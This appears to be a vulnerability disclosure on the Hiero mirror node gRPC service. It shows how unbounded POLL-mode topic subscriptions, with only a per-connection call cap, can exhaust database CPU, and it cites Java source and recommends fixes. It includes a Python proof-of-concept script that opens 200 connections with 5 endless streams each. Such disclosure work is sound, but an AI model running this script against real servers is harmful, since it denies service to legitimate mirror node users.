### Title
Unbounded Concurrent gRPC Subscriptions in POLL Mode Cause Database CPU Exhaustion

### Summary
`PollingTopicListener.listen()` schedules `RepeatSpec.times(Long.MAX_VALUE)` with a 500 ms fixed delay, issuing one DB query per poll cycle per active subscription indefinitely. The gRPC endpoint has no authentication, no global subscription cap, and no rate limiting; only `maxConcurrentCallsPerConnection = 5` exists, which is per-connection and trivially bypassed by opening multiple connections. An unprivileged attacker opening N connections with 5 subscriptions each generates 10N DB queries per second, exhausting database CPU.

### Finding Description
**Exact code path:**

`PollingTopicListener.listen()` (lines 34–48): [1](#0-0) 

```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)
                .withFixedDelay(interval)
                .withScheduler(scheduler))
```

`interval` defaults to 500 ms: [2](#0-1) 

Each `poll()` call executes a full SQL query via `topicMessageRepository.findByFilter()`: [3](#0-2) 

`findByFilter()` executes `getResultList()` (a blocking, full round-trip DB query) on every invocation: [4](#0-3) 

**Root cause — failed assumptions:**

1. `RepeatSpec.times(Long.MAX_VALUE)` is effectively infinite; when `filter.hasLimit()` is false (default `limit = 0`), the loop never self-terminates: [5](#0-4) 

2. The only connection-level guard is `maxConcurrentCallsPerConnection = 5`, which is per-connection, not global: [6](#0-5) [7](#0-6) 

3. `subscriberCount` is a Gauge metric only — never enforced as a cap: [8](#0-7) 

4. No authentication, no IP-based rate limiting, and no global connection limit exist anywhere in the gRPC stack. The REST API has `authHandler` and the web3 module has `ThrottleConfiguration`/`ThrottleManagerImpl`, but the gRPC service has neither: [9](#0-8) 

**Activation condition:** `CompositeTopicListener` routes to `PollingTopicListener` when `listenerProperties.type = POLL`: [10](#0-9) 

### Impact Explanation
Each subscription in POLL mode issues 2 DB queries per second (one `random_page_cost` hint query + one SELECT). With N connections × 5 calls each, the attacker generates 10N queries/second against the database. At modest scale (e.g., 200 connections = 2,000 queries/second), the database CPU saturates, causing latency spikes and denial of service for all mirror node consumers. The `topic_message` table query involves an index scan with a `WHERE topic_id = ? AND consensus_timestamp >= ?` predicate; under load this becomes expensive. The attack is non-network-based (it is a resource exhaustion attack on the DB tier), matching the stated scope.

### Likelihood Explanation
Preconditions are minimal: the attacker needs only network access to the gRPC port (default 5600) and knowledge of any valid `topicId` (all topic IDs are public on-chain). No credentials, tokens, or privileged access are required. The attack is trivially scriptable using any gRPC client library. It is repeatable and persistent as long as connections remain open. The only friction is that POLL mode must be configured (not the default REDIS), but POLL mode is a documented, supported configuration option.

### Recommendation
1. **Enforce a global subscription cap**: Add a configurable `maxSubscribers` to `GrpcProperties` and reject new subscriptions in `TopicMessageServiceImpl.subscribeTopic()` when `subscriberCount.get() >= maxSubscribers`.
2. **Add per-IP connection rate limiting**: Apply a gRPC interceptor or Netty handler that limits connections per source IP.
3. **Set a minimum polling interval floor and enforce it**: The current `@DurationMin(millis = 50)` on `interval` is a server-side config guard, not a per-client guard. Ensure operators set a reasonable interval (≥ 500 ms) and document it as a security-relevant setting.
4. **Add authentication/authorization to the gRPC endpoint**: Mirror the REST API's `authHandler` pattern or use mTLS to require client identity before accepting streaming subscriptions.
5. **Cap `RepeatSpec` repeats** based on subscription type or add a server-side idle timeout that terminates subscriptions producing no new messages after a configurable period.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 200   # 200 connections × 5 streams = 1000 subscriptions = 2000 DB queries/s

def open_subscriptions(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,                  # any valid public topic ID
        consensusStartTime=Timestamp(seconds=0, nanos=0),
        # no limit set → hasLimit() = false → infinite polling
    )
    # Open 5 concurrent streams per connection (maxConcurrentCallsPerConnection limit)
    streams = [stub.subscribeTopic(request) for _ in range(5)]
    for s in streams:
        for _ in s:   # consume to keep stream alive
            pass

threads = [threading.Thread(target=open_subscriptions, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()
# Result: 1000 active subscriptions → ~2000 DB queries/second sustained
```

**Expected result:** Database CPU climbs to saturation; legitimate mirror node queries experience severe latency or timeout. The attack sustains indefinitely with no server-side termination.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L38-43)
```java
        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-61)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L29-30)
```java
    @NotNull
    private Duration interval = Duration.ofMillis(500L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L33-61)
```java
    public Stream<TopicMessage> findByFilter(TopicMessageFilter filter) {
        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
        CriteriaQuery<TopicMessage> query = cb.createQuery(TopicMessage.class);
        Root<TopicMessage> root = query.from(TopicMessage.class);

        Predicate predicate = cb.and(
                cb.equal(root.get(TOPIC_ID), filter.getTopicId()),
                cb.greaterThanOrEqualTo(root.get(CONSENSUS_TIMESTAMP), filter.getStartTime()));

        if (filter.getEndTime() != null) {
            predicate = cb.and(predicate, cb.lessThan(root.get(CONSENSUS_TIMESTAMP), filter.getEndTime()));
        }

        query = query.select(root).where(predicate).orderBy(cb.asc(root.get(CONSENSUS_TIMESTAMP)));

        TypedQuery<TopicMessage> typedQuery = entityManager.createQuery(query);
        typedQuery.setHint(HibernateHints.HINT_READ_ONLY, true);

        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }

        if (filter.getLimit() != 1) {
            // only apply the hint when limit is not 1
            entityManager.createNativeQuery(TOPIC_MESSAGES_BY_ID_QUERY_HINT).executeUpdate();
        }

        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-41)
```java
    @Min(0)
    private long limit;

    @Min(0)
    @NotNull
    @Builder.Default
    private long startTime = DomainUtils.now();

    @Builder.Default
    private String subscriberId = RandomStringUtils.random(8, 0, 0, true, true, null, RANDOM);

    @NotNull
    private EntityId topicId;

    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L27-35)
```java
    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/CompositeTopicListener.java (L46-58)
```java
    private TopicListener getTopicListener() {
        final var type = listenerProperties.getType();

        switch (type) {
            case POLL:
                return pollingTopicListener;
            case REDIS:
                return redisTopicListener;
            case SHARED_POLL:
                return sharedPollingTopicListener;
            default:
                throw new UnsupportedOperationException("Unknown listener type: " + type);
        }
```
